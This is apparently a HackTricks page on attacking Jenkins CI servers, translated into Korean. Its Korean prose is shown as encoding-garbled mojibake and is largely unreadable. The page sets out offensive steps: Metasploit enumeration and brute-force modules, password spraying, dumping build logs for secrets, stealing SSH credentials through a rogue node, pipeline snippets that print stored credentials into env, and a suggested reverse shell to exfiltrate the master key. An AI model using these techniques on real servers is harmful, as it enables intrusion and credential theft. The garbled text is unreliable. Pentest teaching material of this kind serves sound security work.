# Jenkins Security

{% hint style="success" %}
AWS Hacking í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜, **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

JenkinsëŠ” íŒŒì´í”„ë¼ì¸ì„ ì‚¬ìš©í•˜ì—¬ ê±°ì˜ **ëª¨ë“ ** **í”„ë¡œê·¸ë˜ë° ì–¸ì–´** ë° ì†ŒìŠ¤ ì½”ë“œ ì €ì¥ì†Œ ì¡°í•©ì— ëŒ€í•´ **ì§€ì†ì  í†µí•©** ë˜ëŠ” **ì§€ì†ì  ë°°í¬** (CI/CD) í™˜ê²½ì„ ì„¤ì •í•˜ëŠ” ê°„ë‹¨í•œ ë°©ë²•ì„ ì œê³µí•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ë˜í•œ ë‹¤ì–‘í•œ ì¼ìƒ ê°œë°œ ì‘ì—…ì„ ìë™í™”í•©ë‹ˆë‹¤. JenkinsëŠ” ê°œë³„ ë‹¨ê³„ì— ëŒ€í•œ **ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  í•„ìš”ì„±ì„ ì œê±°í•˜ì§€ëŠ” ì•Šì§€ë§Œ**, ë¹Œë“œ, í…ŒìŠ¤íŠ¸ ë° ë°°í¬ ë„êµ¬ì˜ ì „ì²´ ì‹œí€€ìŠ¤ë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì‰½ê²Œ êµ¬ì„±í•  ìˆ˜ ìˆëŠ” ê²ƒë³´ë‹¤ ë” ë¹ ë¥´ê³  ê²¬ê³ í•˜ê²Œ í†µí•©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## ì¸ì¦ë˜ì§€ ì•Šì€ ì—´ê±°

(_/people_ ë˜ëŠ” _/asynchPeople_ê³¼ ê°™ì´ í˜„ì¬ ì‚¬ìš©ìë¥¼ ë‚˜ì—´í•˜ëŠ”) ì¸ì¦ ì—†ì´ í¥ë¯¸ë¡œìš´ Jenkins í˜ì´ì§€ë¥¼ ê²€ìƒ‰í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
ì¸ì¦ ì—†ì´ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```
msf> use auxiliary/scanner/http/jenkins_command
```
ìê²© ì¦ëª… ì—†ì´ _**/asynchPeople/**_ ê²½ë¡œë‚˜ _**/securityRealm/user/admin/search/index?q=**_ì—ì„œ **ì‚¬ìš©ì ì´ë¦„**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê²½ë¡œ _**/oops**_ ë˜ëŠ” _**/error**_ì—ì„œ Jenkins ë²„ì „ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (146).png>)

### ì•Œë ¤ì§„ ì·¨ì•½ì 

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ë¡œê·¸ì¸

ê¸°ë³¸ ì •ë³´ë¥¼ í†µí•´ **Jenkinsì— ë¡œê·¸ì¸í•˜ëŠ” ëª¨ë“  ë°©ë²•**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ë“±ë¡

**ê³„ì •ì„ ìƒì„±í•˜ê³  ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ”** Jenkins ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ì£¼ ê°„ë‹¨í•©ë‹ˆë‹¤.

### **SSO ë¡œê·¸ì¸**

ë˜í•œ **SSO** **ê¸°ëŠ¥**/**í”ŒëŸ¬ê·¸ì¸**ì´ ì¡´ì¬í•œë‹¤ë©´ í…ŒìŠ¤íŠ¸ ê³„ì •(ì˜ˆ: í…ŒìŠ¤íŠ¸ **Github/Bitbucket ê³„ì •**)ì„ ì‚¬ìš©í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì— **ë¡œê·¸ì¸**ì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤. [**ì—¬ê¸°**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ì—ì„œì˜ íŠ¸ë¦­ì…ë‹ˆë‹¤.

### ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©

**Jenkins**ëŠ” **ë¹„ë°€ë²ˆí˜¸ ì •ì±…**ê³¼ **ì‚¬ìš©ì ì´ë¦„ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²© ë°©ì§€**ê°€ ë¶€ì¡±í•©ë‹ˆë‹¤. **ì•½í•œ ë¹„ë°€ë²ˆí˜¸**ë‚˜ **ì‚¬ìš©ì ì´ë¦„ì„ ë¹„ë°€ë²ˆí˜¸ë¡œ ì‚¬ìš©í•˜ëŠ” ê²½ìš°**ê°€ ìˆì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ì‹¬ì§€ì–´ **ë°˜ëŒ€ë¡œ ëœ ì‚¬ìš©ì ì´ë¦„ì„ ë¹„ë°€ë²ˆí˜¸ë¡œ ì‚¬ìš©í•˜ëŠ” ê²½ìš°**ë„ ìˆì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ **ì‚¬ìš©ìì— ëŒ€í•´ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©**ì„ í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

[ì´ python ìŠ¤í¬ë¦½íŠ¸](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ë˜ëŠ” [ì´ powershell ìŠ¤í¬ë¦½íŠ¸](https://github.com/chryzsh/JenkinsPasswordSpray)ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.

### IP Whitelisting Bypass

ë§ì€ ì¡°ì§ì€ GitHub ë˜ëŠ” GitLabê³¼ ê°™ì€ **SaaS ê¸°ë°˜ ì†ŒìŠ¤ ì œì–´ ê´€ë¦¬ (SCM) ì‹œìŠ¤í…œ**ì„ Jenkins ë˜ëŠ” TeamCityì™€ ê°™ì€ **ë‚´ë¶€, ìì²´ í˜¸ìŠ¤íŒ… CI** ì†”ë£¨ì…˜ê³¼ ê²°í•©í•©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ CI ì‹œìŠ¤í…œì´ **SaaS ì†ŒìŠ¤ ì œì–´ ê³µê¸‰ì—…ì²´ë¡œë¶€í„° ì›¹í›… ì´ë²¤íŠ¸ë¥¼ ìˆ˜ì‹ **í•˜ì—¬ ì£¼ë¡œ íŒŒì´í”„ë¼ì¸ ì‘ì—…ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ì¡°ì§ì€ **SCM í”Œë«í¼ì˜ IP ë²”ìœ„**ë¥¼ **í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸**ì— ì¶”ê°€í•˜ì—¬ **ì›¹í›…**ì„ í†µí•´ **ë‚´ë¶€ CI ì‹œìŠ¤í…œ**ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ëˆ„êµ¬ë‚˜** GitHub ë˜ëŠ” GitLabì— **ê³„ì •ì„ ìƒì„±**í•˜ê³  ì´ë¥¼ **ì›¹í›…ì„ íŠ¸ë¦¬ê±°**í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìœ¼ë©°, ì ì¬ì ìœ¼ë¡œ **ë‚´ë¶€ CI ì‹œìŠ¤í…œ**ì— ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í™•ì¸: [https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” Jenkinsì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ìœ íš¨í•œ ê³„ì •ì„ ê°€ì§€ê³  ìˆë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤.

{% hint style="warning" %}
Jenkinsì— êµ¬ì„±ëœ **Authorization** ë©”ì»¤ë‹ˆì¦˜ê³¼ ì†ìƒëœ ì‚¬ìš©ìì˜ ê¶Œí•œì— ë”°ë¼ **ë‹¤ìŒ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆê³  ì—†ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.**
{% endhint %}

ìì„¸í•œ ì •ë³´ëŠ” ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

Jenkinsì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ë©´ [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ì—ì„œ ë‹¤ë¥¸ ë“±ë¡ëœ ì‚¬ìš©ìë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Dumping builds to find cleartext secrets

[ì´ ìŠ¤í¬ë¦½íŠ¸](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¹Œë“œ ì½˜ì†” ì¶œë ¥ê³¼ ë¹Œë“œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ë¤í”„í•˜ì—¬ í‰ë¬¸ ë¹„ë°€ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH ìê²© ì¦ëª… íƒˆì·¨**

ì†ìƒëœ ì‚¬ìš©ìê°€ **ìƒˆ Jenkins ë…¸ë“œë¥¼ ìƒì„±/ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì¶©ë¶„í•œ ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆê³ , ë‹¤ë¥¸ ë…¸ë“œì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ SSH ìê²© ì¦ëª…ì´ ì´ë¯¸ ì €ì¥ë˜ì–´ ìˆë‹¤ë©´, ê·¸ëŠ” ë…¸ë“œë¥¼ ìƒì„±/ìˆ˜ì •í•˜ê³  **í˜¸ìŠ¤íŠ¸ í‚¤ë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  ìê²© ì¦ëª…ì„ ê¸°ë¡í•  í˜¸ìŠ¤íŠ¸ë¥¼ ì„¤ì •**í•˜ì—¬ **ê·¸ ìê²© ì¦ëª…ì„ íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (218).png>)

Jenkins ssh ìê²© ì¦ëª…ì€ ë³´í†µ **ê¸€ë¡œë²Œ ì œê³µì** (`/credentials/`)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ë‹¤ë¥¸ ë¹„ë°€ì„ ë¤í”„í•˜ëŠ” ê²ƒì²˜ëŸ¼ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ [**ë¹„ë°€ ë¤í”„ ì„¹ì…˜**](./#dumping-secrets)ì„ ì°¸ì¡°í•˜ì„¸ìš”.

### **Jenkinsì—ì„œ RCE**

**Jenkins ì„œë²„ì—ì„œ ì…¸ì„ ì–»ëŠ” ê²ƒ**ì€ ê³µê²©ìì—ê²Œ ëª¨ë“  **ë¹„ë°€**ê³¼ **í™˜ê²½ ë³€ìˆ˜**ë¥¼ ìœ ì¶œí•˜ê³ , ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì— ìˆëŠ” ë‹¤ë¥¸ ê¸°ê³„ë¥¼ **ê³µê²©**í•˜ê±°ë‚˜ **í´ë¼ìš°ë“œ ìê²© ì¦ëª…**ì„ ìˆ˜ì§‘í•  ê¸°íšŒë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ JenkinsëŠ” **SYSTEMìœ¼ë¡œ ì‹¤í–‰**ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ ì†ìƒì‹œí‚¤ë©´ ê³µê²©ìëŠ” **SYSTEM ê¶Œí•œ**ì„ ì–»ê²Œ ë©ë‹ˆë‹¤.

### **í”„ë¡œì íŠ¸ ìƒì„±/ìˆ˜ì •ìœ¼ë¡œ RCE**

í”„ë¡œì íŠ¸ë¥¼ ìƒì„±/ìˆ˜ì •í•˜ëŠ” ê²ƒì€ Jenkins ì„œë²„ì—ì„œ RCEë¥¼ ì–»ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ìœ¼ë¡œ RCE**

ìƒˆ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒë³´ë‹¤ ë” ì€ë°€í•˜ê²Œ Groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### íŒŒì´í”„ë¼ì¸ ìƒì„±/ìˆ˜ì •ìœ¼ë¡œ RCE

**íŒŒì´í”„ë¼ì¸ì„ ìƒì„±/ìˆ˜ì •í•˜ì—¬ RCEë¥¼ ì–»ì„** ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## íŒŒì´í”„ë¼ì¸ ìµìŠ¤í”Œë¡œì‡

íŒŒì´í”„ë¼ì¸ì„ ìµìŠ¤í”Œë¡œì‡í•˜ë ¤ë©´ ì—¬ì „íˆ Jenkinsì— ì ‘ê·¼í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

### ë¹Œë“œ íŒŒì´í”„ë¼ì¸

**íŒŒì´í”„ë¼ì¸**ì€ **í”„ë¡œì íŠ¸ì˜ ë¹Œë“œ ë©”ì»¤ë‹ˆì¦˜**ìœ¼ë¡œë„ ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì´ ê²½ìš° íŒŒì´í”„ë¼ì¸ êµ¬ë¬¸ì„ í¬í•¨í•˜ëŠ” **íŒŒì¼ì„ ì €ì¥ì†Œ ë‚´ë¶€ì—** êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ `/Jenkinsfile`ì´ ì‚¬ìš©ë©ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (127).png>)

íŒŒì´í”„ë¼ì¸ êµ¬ì„± íŒŒì¼ì„ **ë‹¤ë¥¸ ì¥ì†Œ**(ì˜ˆ: ë‹¤ë¥¸ ì €ì¥ì†Œ)ì— ì €ì¥í•˜ì—¬ **ì €ì¥ì†Œ ì ‘ê·¼**ê³¼ íŒŒì´í”„ë¼ì¸ ì ‘ê·¼ì„ **ë¶„ë¦¬**í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ê³µê²©ìê°€ **ê·¸ íŒŒì¼ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, **ìˆ˜ì •**í•˜ê³  Jenkinsì— ì ‘ê·¼í•˜ì§€ ì•Šê³ ë„ **íŒŒì´í”„ë¼ì¸ì„ íŠ¸ë¦¬ê±°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê³µê²©ìëŠ” **ì¼ë¶€ ë¸Œëœì¹˜ ë³´í˜¸ë¥¼ ìš°íšŒ**í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(í”Œë«í¼ê³¼ ì‚¬ìš©ì ê¶Œí•œì— ë”°ë¼ ìš°íšŒí•  ìˆ˜ ìˆëŠ”ì§€ ì—¬ë¶€ê°€ ë‹¤ë¦…ë‹ˆë‹¤).

ì‚¬ìš©ì ì •ì˜ íŒŒì´í”„ë¼ì¸ì„ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ ì¼ë°˜ì ì¸ íŠ¸ë¦¬ê±°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ë©”ì¸ ë¸Œëœì¹˜(ë˜ëŠ” ë‹¤ë¥¸ ë¸Œëœì¹˜)ì— ëŒ€í•œ **í’€ ë¦¬í€˜ìŠ¤íŠ¸**
* ë©”ì¸ ë¸Œëœì¹˜(ë˜ëŠ” ë‹¤ë¥¸ ë¸Œëœì¹˜)ì— ëŒ€í•œ **í‘¸ì‹œ**
* ë©”ì¸ ë¸Œëœì¹˜ë¥¼ **ì—…ë°ì´íŠ¸**í•˜ê³  ì–´ë–¤ ë°©ì‹ìœ¼ë¡œë“  ì‹¤í–‰ë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ê¸°

{% hint style="info" %}
**ì™¸ë¶€ ì‚¬ìš©ì**ë¼ë©´ ë‹¤ë¥¸ ì‚¬ìš©ì/ì¡°ì§ì˜ ì €ì¥ì†Œì˜ **ë©”ì¸ ë¸Œëœì¹˜ì— PRì„ ìƒì„±**í•˜ê³  **íŒŒì´í”„ë¼ì¸ì„ íŠ¸ë¦¬ê±°**í•  ìˆ˜ ìˆì„ ê²ƒì´ë¼ê³  ê¸°ëŒ€í•˜ì§€ ì•Šì•„ì•¼ í•©ë‹ˆë‹¤... í•˜ì§€ë§Œ **ì˜ëª» êµ¬ì„±ëœ ê²½ìš°** ì´ë¥¼ **ì•…ìš©í•˜ì—¬ íšŒì‚¬ ì „ì²´ë¥¼ ì™„ì „íˆ ì†ìƒ**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### íŒŒì´í”„ë¼ì¸ RCE

ì´ì „ RCE ì„¹ì…˜ì—ì„œëŠ” [**íŒŒì´í”„ë¼ì¸ì„ ìˆ˜ì •í•˜ì—¬ RCEë¥¼ ì–»ëŠ”**](./#rce-creating-modifying-pipeline) ê¸°ìˆ ì´ ì´ë¯¸ ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤.

### í™˜ê²½ ë³€ìˆ˜ í™•ì¸

ì „ì²´ íŒŒì´í”„ë¼ì¸ ë˜ëŠ” íŠ¹ì • ë‹¨ê³„ì— ëŒ€í•´ **í‰ë¬¸ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„ ì–¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í™˜ê²½ ë³€ìˆ˜ëŠ” **ë¯¼ê°í•œ ì •ë³´ë¥¼ í¬í•¨í•´ì„œëŠ” ì•ˆ ë˜ì§€ë§Œ**, ê³µê²©ìëŠ” í•­ìƒ **ëª¨ë“  íŒŒì´í”„ë¼ì¸** êµ¬ì„±/Jenkinsfileì„ **í™•ì¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

Jenkinsì—ì„œ ë¹„ë°€ ì •ë³´ê°€ ì¼ë°˜ì ìœ¼ë¡œ ì–´ë–»ê²Œ ì²˜ë¦¬ë˜ëŠ”ì§€ì— ëŒ€í•œ ì •ë³´ëŠ” ë‹¤ìŒ ê¸°ë³¸ ì •ë³´ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

ìê²© ì¦ëª…ì€ **ê¸€ë¡œë²Œ ì œê³µì** (`/credentials/`) ë˜ëŠ” **íŠ¹ì • í”„ë¡œì íŠ¸** (`/job/<project-name>/configure`)ì— **ë²”ìœ„ê°€ ì§€ì •ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ, ëª¨ë“  ìê²© ì¦ëª…ì„ ìœ ì¶œí•˜ë ¤ë©´ ë¹„ë°€ ì •ë³´ë¥¼ í¬í•¨í•˜ëŠ” **ëª¨ë“  í”„ë¡œì íŠ¸ë¥¼ ìµœì†Œí•œìœ¼ë¡œ ì†ìƒì‹œí‚¤ê³ ** ì‚¬ìš©ì ì •ì˜/ì˜¤ì—¼ëœ íŒŒì´í”„ë¼ì¸ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ë¬¸ì œëŠ” íŒŒì´í”„ë¼ì¸ì˜ **env ë‚´ë¶€ì— ë¹„ë°€ ì •ë³´ë¥¼ ì–»ìœ¼ë ¤ë©´** ë¹„ë°€ ì •ë³´ì˜ **ì´ë¦„ê³¼ ìœ í˜•ì„ ì•Œì•„ì•¼ í•œë‹¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, **`usernamePassword`** **ë¹„ë°€ ì •ë³´**ë¥¼ **`string`** **ë¹„ë°€ ì •ë³´**ë¡œ **ë¡œë“œ**í•˜ë ¤ê³  í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ **ì˜¤ë¥˜**ê°€ ë°œìƒí•©ë‹ˆë‹¤:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ì—¬ê¸° ëª‡ ê°€ì§€ ì¼ë°˜ì ì¸ ë¹„ë°€ ìœ í˜•ì„ ë¡œë“œí•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
ì´ í˜ì´ì§€ì˜ ëì—ì„œ **ëª¨ë“  ìê²© ì¦ëª… ìœ í˜•ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**ëª¨ë“  ë¹„ë°€ì„ í•œ ë²ˆì— ë¤í”„í•˜ëŠ”** ê°€ì¥ ì¢‹ì€ ë°©ë²•ì€ **Jenkins** ë¨¸ì‹ ì„ **ì†ìƒì‹œí‚¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤ (ì˜ˆë¥¼ ë“¤ì–´ **ë‚´ì¥ ë…¸ë“œ**ì—ì„œ ë¦¬ë²„ìŠ¤ ì…¸ì„ ì‹¤í–‰) ê·¸ëŸ° ë‹¤ìŒ **ë§ˆìŠ¤í„° í‚¤**ì™€ **ì•”í˜¸í™”ëœ ë¹„ë°€**ì„ **ìœ ì¶œ**í•˜ê³  ì˜¤í”„ë¼ì¸ì—ì„œ ì´ë¥¼ ë³µí˜¸í™”í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ì´ ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [Nodes & Agents ì„¹ì…˜](./#nodes-and-agents) ë° [Post Exploitation ì„¹ì…˜](./#post-exploitation)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### íŠ¸ë¦¬ê±°

[ë¬¸ì„œ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ì—ì„œ: `triggers` ì§€ì‹œì–´ëŠ” **íŒŒì´í”„ë¼ì¸ì´ ìë™ìœ¼ë¡œ ë‹¤ì‹œ íŠ¸ë¦¬ê±°ë˜ëŠ” ë°©ë²•**ì„ ì •ì˜í•©ë‹ˆë‹¤. GitHub ë˜ëŠ” BitBucketê³¼ ê°™ì€ ì†ŒìŠ¤ì™€ í†µí•©ëœ íŒŒì´í”„ë¼ì¸ì˜ ê²½ìš°, `triggers`ëŠ” í•„ìš”í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë©°, ì›¹í›… ê¸°ë°˜ í†µí•©ì´ ì´ë¯¸ ì¡´ì¬í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤. í˜„ì¬ ì‚¬ìš© ê°€ëŠ¥í•œ íŠ¸ë¦¬ê±°ëŠ” `cron`, `pollSCM` ë° `upstream`ì…ë‹ˆë‹¤.

Cron ì˜ˆì œ:
```bash
triggers { cron('H */4 * * 1-5') }
```
**ë¬¸ì„œì˜ ë‹¤ë¥¸ ì˜ˆì œë¥¼ í™•ì¸í•˜ì„¸ìš”**.

### Nodes & Agents

**Jenkins ì¸ìŠ¤í„´ìŠ¤**ëŠ” **ë‹¤ë¥¸ ë¨¸ì‹ ì—ì„œ ë‹¤ë¥¸ ì—ì´ì „íŠ¸ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìì˜ ê´€ì ì—ì„œ, ë‹¤ë¥¸ ë¨¸ì‹ ì— ì ‘ê·¼í•˜ëŠ” ê²ƒì€ **ë‹¤ë¥¸ ì ì¬ì  í´ë¼ìš°ë“œ ìê²© ì¦ëª…**ì„ í›”ì¹˜ê±°ë‚˜ **ë‹¤ë¥¸ ë„¤íŠ¸ì›Œí¬ ì ‘ê·¼**ì„ ì•…ìš©í•˜ì—¬ ë‹¤ë¥¸ ë¨¸ì‹ ì„ ê³µê²©í•  ìˆ˜ ìˆëŠ” ê¸°íšŒë¥¼ ì˜ë¯¸í•©ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

**êµ¬ì„±ëœ ë…¸ë“œ**ë¥¼ `/computer/`ì—ì„œ ì—´ê±°í•  ìˆ˜ ìˆìœ¼ë©°, ë³´í†µ \*\*`Built-In Node` \*\* (Jenkinsë¥¼ ì‹¤í–‰í•˜ëŠ” ë…¸ë“œ)ì™€ ì ì¬ì ìœ¼ë¡œ ë” ë§ì€ ë…¸ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (249).png>)

